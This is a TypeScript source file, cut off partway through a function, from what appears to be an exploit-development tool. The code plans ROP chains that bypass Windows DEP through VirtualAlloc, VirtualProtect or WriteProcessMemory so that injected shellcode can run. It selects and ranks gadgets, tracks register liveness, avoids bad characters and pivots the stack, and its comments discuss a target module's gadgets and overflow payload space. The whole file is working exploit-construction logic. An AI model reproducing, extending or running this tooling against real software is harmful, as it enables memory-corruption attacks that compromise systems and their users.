import { CapabilityIndex, spoilsOwnInput } from "../rop/capabilities";
import { rankCandidates } from "../rop/emitter";
import { isPath, ReachIndex, Reg, REGS as REACH_REGS, Val } from "../rop/reach";
import { CapabilityKind, RopGadget } from "../rop/types";
import { FRAMES, FrameFacts, frameGoal, PUSHAD_FRAMES, Slot } from "./dep_frames";
import { DepApi } from "./rop_template";

export type DepPlanStyle = "skeleton" | "pushad" | "staged";

type Source = Slot["source"];

export const DEP_PLAN_APIS: DepApi[] = ["VirtualAlloc", "VirtualProtect", "WriteProcessMemory"];
/** In the order the tool prefers when more than one of them is complete; chooseStyle says why. */
export const DEP_PLAN_STYLES: DepPlanStyle[] = ["skeleton", "pushad", "staged"];
export const DEP_PLAN_SECTIONS = 7;

export type Constant = { field: string; value: number };

// The argument values the chain has to produce, per API. Addresses known only at run time
// (shellcode, the API itself) are not constants and are measured in the draft instead.
export const CONSTANTS: Record<DepApi, Constant[]> = {
  VirtualAlloc: [
    { field: "dwSize", value: 0x1 },
    { field: "flAllocationType", value: 0x1000 },
    { field: "flProtect", value: 0x40 },
  ],
  VirtualProtect: [
    { field: "dwSize", value: 0x201 },
    { field: "flNewProtect", value: 0x40 },
  ],
  WriteProcessMemory: [
    { field: "hProcess", value: 0xffffffff },
    { field: "nSize", value: 0x210 },
  ],
};

// The values a chain carries from one gadget to the next. Skeleton: the captured ESP, the address of the
// field being written, and the value going into it. Pushad: each register already loaded for the frame.
export type Role = "pointer" | "field" | "value" | "edi" | "esi" | "ebp" | "ebx" | "edx" | "ecx" | "eax";
type Port = "dest" | "source" | "address";

const ROLE_NAMES: Record<string, string> = {
  pointer: "the captured ESP",
  field: "the field address",
  value: "the value for the field",
};

function roleName(role: Role): string {
  return ROLE_NAMES[role] ?? `the ${role.toUpperCase()} of the frame`;
}

// What a job does to the roles: which operand of its gadget must hold each role it reads, and which
// operand the role it sets ends up in. Jobs are listed in chain order, so liveness follows from the list.
type Flow = { reads?: Partial<Record<Port, Role>>; sets?: { role: Role; port: Port } };

export type Job = {
  key: string;
  title: string;
  capabilities: CapabilityKind[];
  register?: string;
  /** The chain runs it once per field, so a role it reads is live again when the next field comes
   * round. Liveness is read off this rather than off a list of keys, so a style's own fill jobs say
   * for themselves that they repeat. */
  repeats?: boolean;
  /** The `add` job only: its distance runs back towards lower addresses, so only a gadget that adds can
   * carry it. The chain pops the distance, a sub consumes the opposite sign of an add, and a few hundred
   * bytes is 0x000001xx one way round, which no target with 00 among its bad chars can send. */
  backwards?: boolean;
  flow: Flow;
};

const SKELETON_JOBS: Job[] = [
  { key: "capture", title: "capture ESP", capabilities: ["STACK_POINTER_CAPTURE"], flow: { sets: { role: "pointer", port: "dest" } } },
  { key: "add", title: "add the distance to field 1", capabilities: ["REGISTER_ADD", "REGISTER_SUB"], backwards: true,
    flow: { reads: { dest: "pointer" }, sets: { role: "pointer", port: "dest" } } },
  { key: "copy", title: "copy a register", capabilities: ["MOVE_REGISTER", "EXCHANGE_REGISTER"],
    flow: { reads: { source: "pointer" }, sets: { role: "field", port: "dest" } } },
  { key: "read", title: "read a pointer", capabilities: ["MEMORY_READ"], flow: { sets: { role: "value", port: "dest" } } },
  { key: "write", title: "write a field", capabilities: ["MEMORY_WRITE"], repeats: true, flow: { reads: { address: "field", source: "value" } } },
  { key: "advance", title: "advance the pointer (inc reg)", capabilities: ["REGISTER_INCREMENT"], repeats: true,
    flow: { reads: { dest: "field" }, sets: { role: "field", port: "dest" } } },
  { key: "negate", title: "negate", capabilities: ["REGISTER_NEGATE"], repeats: true, flow: { sets: { role: "value", port: "dest" } } },
  { key: "pivot", title: "pivot ESP onto the frame", capabilities: ["STACK_PIVOT"], flow: { reads: { source: "field" } } },
];

// A staged chain lays the frame at a fixed writable address in the module instead of in the stack
// buffer. Every field's address is then a constant, which is what the whole pointer apparatus of the
// skeleton exists to avoid needing: there is nothing to copy out of the captured ESP, nothing to walk
// from one field to the next with an `inc`, and the pivot targets a constant rather than a register the
// chain has carried. What is left is a load per field address, the write, and the one value no constant
// can be, the shellcode's address in the payload, which is still the captured ESP plus a distance.
//
// The field load comes after the value, not before it, and that is the second half of the gain: the
// skeleton has to keep the field address live across every value load because only a run can tell it
// what the address is, while a constant can be popped again at any point. So the value loads here keep
// nothing at all, and a gadget the skeleton refused for clobbering the field address is usable.
const STAGED_JOBS: Job[] = [
  { key: "capture", title: "capture ESP", capabilities: ["STACK_POINTER_CAPTURE"], flow: { sets: { role: "pointer", port: "dest" } } },
  { key: "add", title: "add the distance to the shellcode", capabilities: ["REGISTER_ADD", "REGISTER_SUB"],
    flow: { reads: { dest: "pointer" }, sets: { role: "pointer", port: "dest" } } },
  { key: "read", title: "read a pointer", capabilities: ["MEMORY_READ"], flow: { sets: { role: "value", port: "dest" } } },
  { key: "negate", title: "negate", capabilities: ["REGISTER_NEGATE"], repeats: true, flow: { sets: { role: "value", port: "dest" } } },
  { key: "field", title: "load a field address", capabilities: ["LOAD_REGISTER"], repeats: true,
    flow: { sets: { role: "field", port: "dest" } } },
  { key: "write", title: "write a field", capabilities: ["MEMORY_WRITE"], repeats: true, flow: { reads: { address: "field", source: "value" } } },
  { key: "pivot", title: "pivot ESP onto the frame", capabilities: ["STACK_PIVOT"], flow: {} },
];

/** The registers the PUSHAD draft loads, in the order it loads them, read off the API's own frame. ESI
 * first for VirtualAlloc and VirtualProtect (the API, read from the slot), EBX first for
 * WriteProcessMemory, whose five arguments do not fit the four spare registers so two of them never get
 * loaded at all. */
const pushadRegisters = (api: DepApi): Role[] =>
  PUSHAD_FRAMES[api].filter((slot) => slot.register !== undefined).map((slot) => slot.register as Role);

/** The jobs a style needs for one API, derived from the frame that API's call takes rather than listed.
 *
 * Both halves of this used to be a constant. The skeleton's was one list for every API, so a target was
 * refused for having no `neg` when the API in hand takes every constant from the search; the PUSHAD half
 * was seven pops for every API, so a WriteProcessMemory target was refused for having no `pop esi` when
 * its frame leaves ESI alone. Both now come off `FRAMES` and `PUSHAD_FRAMES`, so a job can only be
 * required by a slot that exists. */
export function jobsFor(style: DepPlanStyle, api: DepApi = "VirtualAlloc"): Job[] {
  if (style === "pushad") {
    const registers = pushadRegisters(api);
    return [
      // The API's address is a dword in the import table, so it is read, not popped. Only a frame that
      // has no API slot could skip this, and none does.
      ...(PUSHAD_FRAMES[api].some((slot) => slot.source.kind === "api")
        ? [{ key: "read", title: "read a pointer (the IAT slot)", capabilities: ["MEMORY_READ"] as CapabilityKind[], flow: {} }] : []),
      ...registers.map((register): Job => ({
        key: `pop_${register}`, title: `pop ${register}`, capabilities: ["LOAD_REGISTER"], register, flow: { sets: { role: register, port: "dest" } },
      })),
      { key: "pushad", title: "pushad ; ret", capabilities: ["DISPATCH_PUSHAD"],
        flow: { reads: registers.reduce((reads, register) => ({ ...reads, [register]: register }), {}) } },
    ];
  }
  const frame = FRAMES[api];
  const needs = (kind: Source["kind"]): boolean => frame.some((slot) => slot.source.kind === kind);
  if (style === "staged") {
    return STAGED_JOBS.filter((job) => {
      // ESP is wanted for one reason only: the shellcode is in the payload, so its address is the
      // captured ESP plus a distance. A frame with no such slot needs neither job.
      if (job.key === "capture" || job.key === "add") return needs("shellcode");
      // The API's address is a dword in the import table, so it is read, not popped.
      if (job.key === "read") return needs("api");
      // The negate exists to send the size, and the size is the one value the emitted script chooses at
      // run time. Only VirtualAlloc's frame computes one.
      if (job.key === "negate") return needs("size");
      return true;
    });
  }
  return SKELETON_JOBS.filter((job) => {
    // The negate exists to send the size, and the size is the one value the emitted script chooses at
    // run time. Only VirtualAlloc's frame computes one.
    if (job.key === "negate") return needs("size");
    // The capture turns ESP into the address of the frame in the buffer, and that address is what the
    // shellcode slot is measured from.
    if (job.key === "capture") return needs("shellcode");
    // The pointer walks from one field to the next, so it is wanted only when more than one field is
    // written by the chain rather than carried as a literal dword in the payload.
    if (job.key === "advance") return frame.filter((slot) => slot.source.kind !== "const").length > 1;
    return true;
  });
}

function readsOf(job: Job): Role[] {
  const reads = (job.flow.reads ?? {}) as Record<string, Role>;
  return Object.keys(reads).map((port) => reads[port]);
}

// A role is live after a job when a later job reads it before any job sets it again. A job marked
// `repeats` runs once per field, so for it the list wraps: the next field's write reads the field
// address again. The role the job itself sets is its output, not something to keep. Each pass of the
// loop starts with the next field's loader, which sets the value afresh, so the value written to one
// field is never live across the advance to the next.
const NEXT_FIELD: Job = { key: "load", title: "load the next field's value", capabilities: [], flow: { sets: { role: "value", port: "dest" } } };

export function liveAfter(jobs: Job[], index: number, withOwn = false): Role[] {
  const loop = [NEXT_FIELD, ...jobs.filter((job) => job.repeats)];
  const later = jobs.slice(index + 1).concat(loop.indexOf(jobs[index]) >= 0 ? loop : []);
  const own = withOwn ? undefined : jobs[index].flow.sets?.role;
  const live: Role[] = [];
  const killed: Role[] = [];
  for (const job of later) {
    for (const role of readsOf(job)) if (role !== own && killed.indexOf(role) < 0 && live.indexOf(role) < 0) live.push(role);
    if (job.flow.sets) killed.push(job.flow.sets.role);
  }
  return live;
}

export function movesEsp(gadget: RopGadget): boolean {
  return gadget.categories.includes("STACK_PIVOT") || gadget.capabilities.some((capability) => capability.kind === "STACK_PIVOT");
}

// A capability whose destination is ESP does no job here: `add esp, 0x10 ; ret` is a REGISTER_ADD
// and `mov esp, ebp ; ...` a MOVE_REGISTER, and neither leaves a working pointer behind.
function jobCapability(gadget: RopGadget, job: Job) {
  return gadget.capabilities.find((capability) =>
    job.capabilities.includes(capability.kind)
    && (job.register === undefined || capability.register === job.register)
    && capability.register !== "esp");
}

// A gadget that moves ESP only fits the pivot job; anywhere else it throws the chain away.
function ranked(index: CapabilityIndex, job: Job, exclude: number[]): RopGadget[] {
  return rankCandidates(index.gadgets.filter((gadget) =>
    jobCapability(gadget, job) !== undefined && (job.key === "pivot" || !movesEsp(gadget))
    && exclude.indexOf(gadgetAddress(gadget)) < 0));
}

const REGISTER = /^e(ax|bx|cx|dx|si|di|bp|sp)$/;

export function memoryBase(text: string): { base?: string; offset: number } {
  const match = /\[\s*(e[a-z]{2})\s*(?:([+-])\s*(0x[0-9a-f]+|\d+))?\s*\]/i.exec(text);
  if (!match) return { offset: 0 };
  const offset = match[3] ? parseInt(match[3], match[3].indexOf("0x") === 0 ? 16 : 10) : 0;
  return { base: match[1].toLowerCase(), offset: match[2] === "-" ? -offset : offset };
}

function pivotSource(gadget: RopGadget): string | undefined {
  for (const instruction of gadget.instructions) {
    const operands = instruction.operands.map((operand) => operand.trim().toLowerCase());
    if (instruction.mnemonic === "leave") return "ebp";
    if (instruction.mnemonic === "mov" && operands[0] === "esp" && REGISTER.test(operands[1] ?? "")) return operands[1];
    if (instruction.mnemonic === "xchg" && operands.indexOf("esp") >= 0) return operands[0] === "esp" ? operands[1] : operands[0];
  }
  return undefined;
}

export type Ports = Partial<Record<Port, string>> & { offset?: number };

// The register each operand of the job's own instruction names.
function ports(gadget: RopGadget, job: Job): Ports {
  const capability = jobCapability(gadget, job);
  if (!capability) return {};
  const evidence = capability.evidence[0] ?? "";
  if (job.key === "read") {
    const memory = memoryBase(evidence);
    return { dest: capability.register, address: memory.base, offset: memory.offset };
  }
  if (job.key === "write") {
    const memory = memoryBase(evidence);
    return { source: capability.register, address: memory.base, offset: memory.offset };
  }
  if (job.key === "pivot") return { source: pivotSource(gadget) };
  return { dest: capability.register, source: capability.targetRegister };
}

export function writtenRegisters(gadget: RopGadget): string[] {
  const summary = gadget.semanticSummary.summary;
  const written: string[] = [];
  for (const register of [...summary.writes.values.exact, ...summary.writes.values.conservative].map(String)) {
    if (register !== "esp" && register !== "eip" && written.indexOf(register) < 0) written.push(register);
  }
  return written;
}

export function memoryWrites(gadget: RopGadget, own: string): string[] {
  return gadget.instructions
    .filter((instruction) => instruction.mnemonic !== "push" && (instruction.operands[0] ?? "").indexOf("[") >= 0
      && instruction.normalizedText !== own)
    .map((instruction) => instruction.operands[0].trim());
}

export function holds(gadget: RopGadget, dest: string, source: string): boolean {
  const transforms = gadget.semanticSummary.summary.registerTransforms as Record<string, { kind: string; base?: string; offset?: { kind: string; value?: number } }>;
  const transform = transforms[dest];
  return transform !== undefined && transform.kind === "affine" && transform.base === source
    && transform.offset?.kind === "constant" && transform.offset.value === 0;
}

/** Roles whose register the chain knows holds a readable address. An argument value is not one: a
 * gadget that dereferences a register holding `dwSize` reads an unmapped address and the process dies
 * there, which is what makes libbkup's three pushad gadgets unusable. */
const POINTER_ROLES: Role[] = ["pointer", "field"];

/** Registers the gadget takes a memory address from, other than its own job's operand and ESP. */
export function dereferencedRegisters(gadget: RopGadget, own: string): string[] {
  const found: string[] = [];
  for (const instruction of gadget.instructions) {
    if (instruction.normalizedText === own || instruction.mnemonic === "push" || instruction.mnemonic === "pop") continue;
    for (const operand of instruction.operands) {
      const { base } = memoryBase(operand);
      if (base && base !== "esp" && found.indexOf(base) < 0) found.push(base);
    }
  }
  return found;
}

/** Above this many bytes of stack beyond its ret, a gadget is releasing a function's local frame, not
 * doing a job: `pop ebp ; add esp, 0x1008 ; ret 0x4` pads 1026 junk dwords into the payload. Every gadget
 * in libbkup's corpus stays at 0x34 or under, so the line sits between the two kinds. */
export const LARGE_STACK_MOVE = 0x40;

/** Bytes of stack the gadget takes beyond its own ret, when the semantics know it exactly. */
export function stackMove(gadget: RopGadget): number | undefined {
  const deltas = [...gadget.semanticSummary.summary.stackDelta.values.exact];
  return deltas.length === 1 ? Number(deltas[0]) - 4 : undefined;
}

export function movesStackFar(gadget: RopGadget, job: Job): boolean {
  const move = stackMove(gadget);
  return job.key !== "pivot" && move !== undefined && move > LARGE_STACK_MOVE;
}

export type Verdict = {
  gadget: RopGadget;
  at: Ports;
  usable: boolean;
  /** It takes more than LARGE_STACK_MOVE bytes of stack, so using it grows the payload by that much. */
  far: boolean;
  move?: string;
  /** Registers it dereferences that nothing in the chain has pointed anywhere by this job. */
  uncontrolled: string[];
  /** The instruction that does the job is the gadget's first, so nothing runs before it that could
   * corrupt its input. `sbb eax, eax ; neg eax ; ret` negates, but not the value you gave it. */
  leads: boolean;
  reason: string;
};

export type JobPlan = {
  job: Job;
  live: Array<{ role: Role; register: string }>;
  verdicts: Verdict[];
  pick?: Verdict;
  /** No single gadget does the job, and a sequence does: what it moves where, and its gadgets in order. */
  path?: { from: string; to: string; gadgets: RopGadget[] };
};

/** A job is done when one gadget does it or a sequence of them does. */
export const met = (plan: JobPlan): boolean => plan.pick !== undefined || plan.path !== undefined;

/** The job that first puts the address of the field being written into a register. The skeleton copies
 * the captured ESP there, a staged frame pops a constant, and the jobs after it read it off whichever
 * register that one landed in. Found by the role it sets, so no job after it names a key. */
const fieldSetter = <T extends { job: Job }>(jobs: T[]): T | undefined =>
  jobs.filter((entry) => entry.job.flow.sets?.role === "field")[0];

/** Where the chain holds the address of the field it is writing, by a single gadget or by a path. */
export function fieldRegister(plans: JobPlan[]): string | undefined {
  const plan = fieldSetter(plans);
  return plan?.pick?.at.dest ?? plan?.path?.to;
}

// Rejections no register move can fix: the gadget destroys a value the chain still needs, or it cannot do the job.
function rejection(gadget: RopGadget, job: Job, at: Ports, live: Array<{ role: Role; register: string }>, bound: Partial<Record<Role, string>>): string | undefined {
  const capability = jobCapability(gadget, job);
  if (job.key === "add") {
    // A staged chain's distance runs forward, to the shellcode, and says nothing here: whether its own
    // sign can be sent depends on a negate of the distance register, which is a question about the
    // corpus, and dep_build's sled route is where it is asked and answered.
    if (job.backwards && capability?.kind === "REGISTER_SUB") return "subtracts: the distance to field 1 is negative, so pop it and add";
    if (!REGISTER.test(at.source ?? "")) return `adds a fixed ${at.source}, not the distance you pop`;
    if (at.source === at.dest) return `adds ${at.dest} to itself, which doubles it and adds no distance`;
  }
  if (job.key === "copy" && at.dest && at.source && !holds(gadget, at.dest, at.source)) return `${at.dest} does not keep the copy`;
  if (job.key === "copy" && bound.pointer !== undefined && at.source !== bound.pointer) return `copies ${at.source}, but the captured ESP is in ${bound.pointer}`;
  if (job.key === "pivot" && !at.source) return "takes ESP from the stack, not from a register";
  // The instruction that does the job is not the first, and something before it overwrites the register
  // the job works on. `sbb eax, eax ; neg eax ; ret` negates, but never the value you handed it.
  const target = at.dest ?? at.source;
  if (target && spoilsOwnInput(gadget, capability?.evidence[0] ?? "", target)) {
    return `something before it overwrites ${target}, so it works on that instead of the value you gave it`;
  }
  const extra = memoryWrites(gadget, capability?.evidence[0] ?? "");
  if (job.key !== "write" && extra.length > 0) return `also writes memory at ${extra[0]}`;
  const written = writtenRegisters(gadget);
  for (const { role, register } of live) {
    if (job.key === "read" && at.address === register) return `reads through ${register}: loading the slot there clobbers ${roleName(role)}`;
    if (written.indexOf(register) >= 0) return `clobbers ${register}, which still holds ${roleName(role)}`;
  }
  return undefined;
}

function sideNote(gadget: RopGadget, job: Job, at: Ports): string {
  const notes: string[] = [];
  if (at.offset) notes.push(`lands ${at.offset > 0 ? "+" : "-"}0x${Math.abs(at.offset).toString(16)} from ${at.address}`);
  const reads = gadget.instructions.filter((instruction) => job.key !== "read"
    && instruction.operands.slice(1).some((operand) => operand.indexOf("[") >= 0 && operand.indexOf("esp") < 0));
  if (reads.length > 0) notes.push(`also reads ${reads[0].operands[1].trim()}, which must be readable`);
  return notes.join("; ");
}

// Why an exact candidate fits: where it takes its inputs from, the registers it leaves alone, and its quirks.
function exactReason(gadget: RopGadget, job: Job, at: Ports, live: Array<{ role: Role; register: string }>, bound: Partial<Record<Role, string>>): string {
  const reads = (job.flow.reads ?? {}) as Record<string, Role>;
  const takes = (Object.keys(reads) as Port[])
    .filter((port) => bound[reads[port]] !== undefined && at[port] !== undefined)
    .map((port) => `${roleName(reads[port])} from ${at[port]}`);
  const named = takes.join(" ");
  const keeps = live.map((entry) => entry.register).filter((register) => named.indexOf(register) < 0);
  const parts = [
    takes.length > 0 ? `takes ${takes.join(" and ")}` : "",
    keeps.length > 0 ? `keeps ${keeps.join(", ")}` : "",
    sideNote(gadget, job, at),
  ].filter(Boolean);
  return parts.length > 0 ? parts.join("; ") : "nothing to keep yet, so the first in the ranking";
}

function moves(job: Job, at: Ports, bound: Partial<Record<Role, string>>): string[] {
  const reads = (job.flow.reads ?? {}) as Record<string, Role>;
  const out: string[] = [];
  for (const port of Object.keys(reads) as Port[]) {
    const register = bound[reads[port]];
    if (register !== undefined && at[port] !== undefined && at[port] !== register) out.push(`${roleName(reads[port])} from ${register} into ${at[port]}`);
  }
  const sets = job.flow.sets;
  const target = sets ? bound[sets.role] : undefined;
  if (sets && target !== undefined && job.flow.reads === undefined && at[sets.port] !== target) {
    out.push(`${roleName(sets.role)} from ${at[sets.port]} into ${target}`);
  }
  return out;
}

// Walk the jobs in chain order. Each pick binds the role it sets to its register; later jobs must keep
// that register and read their inputs from it. The pick is the first candidate in the old ranking that
// does both, else the first that keeps every live register and only needs a move first.
export function planJobs(index: CapabilityIndex | undefined, style: DepPlanStyle, exclude: number[] = [], api: DepApi = "VirtualAlloc", copiedTo?: string, preferred: Record<string, number> = {}): JobPlan[] {
  const jobs = jobsFor(style, api);
  const bound: Partial<Record<Role, string>> = {};
  const firstField = fieldSetter(jobs.map((job) => ({ job })))?.job;
  const plans = jobs.map((job, position) => {
    const later = liveAfter(jobs, position, true);
    const live = liveAfter(jobs, position)
      .filter((role) => bound[role] !== undefined)
      .map((role) => ({ role, register: bound[role] as string }));
    // A register counts as pointed somewhere only if the chain put an address in it: the roles above,
    // or the operand this job itself sets up.
    const pointed = POINTER_ROLES.map((role) => bound[role]).filter((register): register is string => register !== undefined);
    const verdicts = (index ? ranked(index, job, exclude) : []).map((gadget): Verdict => {
      const at = ports(gadget, job);
      const own = jobCapability(gadget, job)?.evidence[0] ?? "";
      const leads = own !== "" && own === gadget.instructions[0]?.normalizedText;
      const controlled = [...pointed, at.address].filter((register): register is string => register !== undefined);
      const uncontrolled = dereferencedRegisters(gadget, own).filter((register) => controlled.indexOf(register) < 0);
      const far = movesStackFar(gadget, job);
      const note = (uncontrolled.length > 0
        ? `; reads through ${uncontrolled.join(", ")}, which nothing in the chain has pointed anywhere yet`
        : "") + (far ? `; takes 0x${(stackMove(gadget) ?? 0).toString(16)} bytes of stack, all of it junk in the payload` : "");
      const rejected = rejection(gadget, job, at, live, bound);
      if (rejected) return { gadget, at, usable: false, far, uncontrolled, leads, reason: rejected };
      const needed = moves(job, at, bound);
      if (needed.length > 0) {
        const back = readsOf(job).some((role) => later.indexOf(role) >= 0) ? ", and back after" : "";
        const move = `${needed.join(", ")} first${back}`;
        return { gadget, at, usable: true, far, move, uncontrolled, leads, reason: `move ${move}${note}` };
      }
      return { gadget, at, usable: true, far, uncontrolled, leads, reason: `${exactReason(gadget, job, at, live, bound)}${note}` };
    });
    // A gadget that dereferences a register nothing points anywhere faults at run time however clean it
    // looks, and one that takes kilobytes of stack can push the payload past the space the overflow gives,
    // so neither wins while a candidate without that property exists.
    const tiers: Array<(verdict: Verdict) => boolean> = [
      (verdict) => !verdict.move && verdict.uncontrolled.length === 0 && !verdict.far,
      (verdict) => verdict.uncontrolled.length === 0 && !verdict.far,
      (verdict) => !verdict.move && verdict.uncontrolled.length === 0,
      (verdict) => verdict.uncontrolled.length === 0,
      (verdict) => !verdict.move,
      () => true,
    ];
    const usable = verdicts.filter((verdict) => verdict.usable);
    // A caller that has already judged this job by something the ranking cannot see names its gadget, and
    // it wins over the ranking. Only a usable candidate can be named, so this cannot force a trap in.
    const named = usable.filter((verdict) => gadgetAddress(verdict.gadget) === preferred[job.key])[0];
    const pick = named ?? tiers.map((tier) => usable.filter(tier)[0]).filter((verdict) => verdict !== undefined)[0];
    const sets = job.flow.sets;
    // A copy no single gadget does still leaves the field address somewhere: where the path put it.
    if (!pick && sets && job === firstField && copiedTo) bound[sets.role] = copiedTo;
    if (pick && sets) {
      const register = ports(pick.gadget, job)[sets.port];
      if (register && (bound[sets.role] === undefined || !pick.move)) bound[sets.role] = register;
    }
    return { job, live, verdicts, pick };
  });
  // The field setter exists to put the field address where the write reads it from. Its own ranking
  // cannot know that, because the write comes after it and nothing has bound the field yet, so a module
  // with several copies takes the cheapest and the chain then pays a move on every field, or lands the
  // field in the register the values have to be loaded into. Once the write's pick is known the setter is
  // picked again to land there, once, and only then does the path search get asked for one.
  const writeAt = plans.filter((plan) => plan.job.key === "write")[0]?.pick?.at.address;
  const setter = fieldSetter(plans);
  if (writeAt && setter && preferred[setter.job.key] === undefined && setter.pick && setter.pick.at.dest !== writeAt) {
    const better = setter.verdicts.filter((verdict) => verdict.usable && verdict.at.dest === writeAt)[0];
    if (better) return planJobs(index, style, exclude, api, copiedTo, { ...preferred, [setter.job.key]: gadgetAddress(better.gadget) });
  }
  const done = withPaths(plans, index, exclude);
  const copied = fieldSetter(done)?.path?.to;
  // The jobs after the field setter were picked not knowing where the field address is. Now that the
  // path says, they are picked again keeping it, once.
  return copied && copied !== copiedTo ? withPaths(planJobs(index, style, exclude, api, copied, preferred), index, exclude) : done;
}

/** One write candidate weighed against the frame: where it takes its two operands, and how many of the
 * frame's values the corpus can then load into the one it reads the value from. */
export type WriteTrial = { address: number; sequence: string; value: string; field: string; filled: number; of: number; unmet: number };

/** The plans of a style that writes the frame field by field, with the write gadget chosen by the frame
 * it has to fill. The skeleton and the staged style both do that; PUSHAD does not write memory at all.
 *
 * Such a chain carries two things from gadget to gadget: the address of the field it is writing and the
 * value going into it. Which register holds which is decided entirely by the write gadget's two
 * operands, and every loader after it must then produce its value in one register while keeping the
 * other. The old ranking picks that gadget for its side effects alone, so a module whose cheapest write
 * is `mov [eax+4], ecx` forces every value into ECX with EAX held, and a value the corpus can only reach
 * in EAX is then reported out of reach when a lower-ranked write would have taken it.
 *
 * So which write to use is a question about the values the frame carries, not about the gadget on its
 * own. Each usable candidate is tried, the whole job list re-planned around it, and the one whose frame
 * the corpus can actually fill is kept. The PUSHAD style already settles its register order this way
 * before a single loader is written; this asks the same question for a frame written field by field.
 *
 * `tried` is the evidence for the choice and is printed, because a decision the tool cannot show is
 * worse than one it does not make.
 */
export function planWrites(
  index: CapabilityIndex | undefined,
  exclude: number[],
  api: DepApi,
  facts: FrameFacts,
  badchars: number[],
  style: DepPlanStyle = "skeleton",
): { plans: JobPlan[]; tried: WriteTrial[] } {
  const base = planJobs(index, style, exclude, api);
  const goals = FRAMES[api].map((slot) => frameGoal(slot, facts)).filter((goal): goal is Val => goal !== undefined);
  const write = base.filter((plan) => plan.job.key === "write")[0];
  if (!index || !write || goals.length === 0) return { plans: base, tried: [] };

  // The register pair is all that distinguishes one candidate from another here: two gadgets that write
  // the same value register through the same address register leave every loader the same question, so
  // only the first of them is tried.
  const pairs: Verdict[] = [];
  const ordered = write.pick ? [write.pick, ...write.verdicts.filter((verdict) => verdict !== write.pick)] : write.verdicts;
  for (const verdict of ordered.filter((candidate) => candidate.usable && candidate.uncontrolled.length === 0 && !candidate.far)) {
    const key = (at: Ports): string => `${at.source}|${at.address}|${at.offset ?? 0}`;
    if (!pairs.some((kept) => key(kept.at) === key(verdict.at))) pairs.push(verdict);
    if (pairs.length >= 4) break;
  }
  if (pairs.length <= 1) return { plans: base, tried: [] };

  // One index and one answer cache for every candidate: the corpus and the bad chars do not change
  // between them, only which register is asked for and which is kept. The scratch dword is the one the
  // build will use, so the question asked here is the question the loaders will ask.
  const search = new ReachIndex(index.gadgets.filter((gadget) => exclude.indexOf(gadgetAddress(gadget)) < 0 && !movesEsp(gadget)));
  const clean = (value: number): boolean => [0, 8, 16, 24].every((shift) => badchars.indexOf((value >>> shift) & 0xff) < 0);
  const scratch = facts.writable !== undefined && clean(facts.writable) ? { at: facts.writable, text: "WRITABLE" } : undefined;
  const answers: Record<string, boolean> = {};
  const reaches = (register: string, goal: Val, keep: string[]): boolean => {
    const key = `${register}|${goal.mem?.at ?? ""}|${goal.k}|${keep.join(",")}`;
    if (answers[key] === undefined) {
      answers[key] = (REACH_REGS as string[]).indexOf(register) >= 0
        && isPath(search.reach(register as Reg, goal, { bad: badchars, keep, scratch }));
    }
    return answers[key];
  };

  const tried: WriteTrial[] = pairs.map((candidate) => {
    const address = gadgetAddress(candidate.gadget);
    const plans = candidate === write.pick ? base : planJobs(index, style, exclude, api, undefined, { write: address });
    const chosen = plans.filter((plan) => plan.job.key === "write")[0]?.pick;
    const field = fieldRegister(plans) ?? "";
    const value = chosen?.at.source ?? "";
    return {
      address, sequence: sequence(candidate.gadget), value, field,
      filled: goals.filter((goal) => reaches(value, goal, field ? [field] : [])).length,
      of: goals.length,
      unmet: plans.filter((plan) => !met(plan)).length,
    };
  });

  // Fewest jobs left open first, then the most of the frame filled, then the old ranking's order. A
  // candidate that fills no more of the frame than the ranking's own pick never displaces it.
  const best = tried.slice().sort((a, b) => a.unmet - b.unmet || b.filled - a.filled || tried.indexOf(a) - tried.indexOf(b))[0];
  const plans = best.address === gadgetAddress(write.pick?.gadget ?? pairs[0].gadget)
    ? base : planJobs(index, style, exclude, api, undefined, { write: best.address });
  return { plans, tried };
}

// The jobs a sequence can do when no single gadget does. Searched over what each gadget does to the
// registers, so `push eax ; pop ecx ; ret` is a copy and `pop eax` then `xchg eax, esi` is a load of ESI.
function withPaths(plans: JobPlan[], index: CapabilityIndex | undefined, exclude: number[]): JobPlan[] {
  const setter = fieldSetter(plans);
  const writeAddress = plans.filter((plan) => plan.job.key === "write")[0]?.pick?.at.address;
  // A field setter whose single gadget lands the field address somewhere other than the register the
  // write reads it from leaves every field paying a move there and a move back, and when that register
  // is also the one the values are loaded into the chain has nowhere to put them at all. So a misplaced
  // setter is one to search a path for, exactly as an absent one is.
  const misplaced = setter?.pick !== undefined && writeAddress !== undefined && setter.pick.at.dest !== writeAddress;
  if (!index || (!misplaced && plans.every((plan) => plan.pick))) return plans;
  const search = new ReachIndex(index.gadgets.filter((gadget) => exclude.indexOf(gadgetAddress(gadget)) < 0 && !movesEsp(gadget)));
  const picked = (key: string): Verdict | undefined => plans.filter((plan) => plan.job.key === key)[0]?.pick;
  const isReg = (register: string | undefined): register is Reg => register !== undefined && (REACH_REGS as string[]).indexOf(register) >= 0;
  return plans.map((plan): JobPlan => {
    if (setter && plan.job === setter.job && (!plan.pick || misplaced)) {
      // Where the field address comes from is what separates the two styles that write a frame field by
      // field. The skeleton's setter reads the captured ESP, so its path is a copy between registers; a
      // staged frame's setter reads nothing, because the address is a constant, so its path is a fill of
      // that register from the chain's own dwords. Either way it has to end in the write's register.
      const carries = plan.job.flow.reads !== undefined;
      const from = carries ? picked("capture")?.at.dest : "the chain";
      const to = writeAddress;
      const gadgets = !isReg(to) ? undefined
        : carries ? (isReg(from) ? search.copy(from, to, [])?.map((effect) => effect.gadget) : undefined)
          : load(to, []);
      return gadgets && from ? { ...plan, pick: undefined, path: { from, to: to as string, gadgets } } : plan;
    }
    if (plan.pick) return plan;
    if (plan.job.key.indexOf("pop_") === 0 && isReg(plan.job.register)) {
      const gadgets = load(plan.job.register, []);
      if (gadgets) return { ...plan, path: { from: "the chain", to: plan.job.register, gadgets } };
    }
    if (plan.job.key === "add") {
      // The distance goes onto the captured ESP, or onto the field address once it is copied, from any
      // register the chain can load: the build searches for the value itself, bad bytes and all.
      const copied = plans.filter((other) => other.job.key === "copy")[0];
      for (const to of [picked("capture")?.at.dest, copied?.pick?.at.dest ?? copied?.path?.to]) {
        if (!isReg(to)) continue;
        for (const gadget of index.gadgets) {
          const by: string | undefined = gadget.capabilities.filter((cap) => (cap.kind === "REGISTER_ADD" || cap.kind === "REGISTER_SUB") && cap.register === to)[0]?.targetRegister;
          if (!isReg(by) || by === to || movesEsp(gadget) || exclude.indexOf(gadgetAddress(gadget)) >= 0) continue;
          const loaded = load(by, [to]);
          if (loaded) return { ...plan, path: { from: "a distance", to, gadgets: [...loaded, gadget] } };
        }
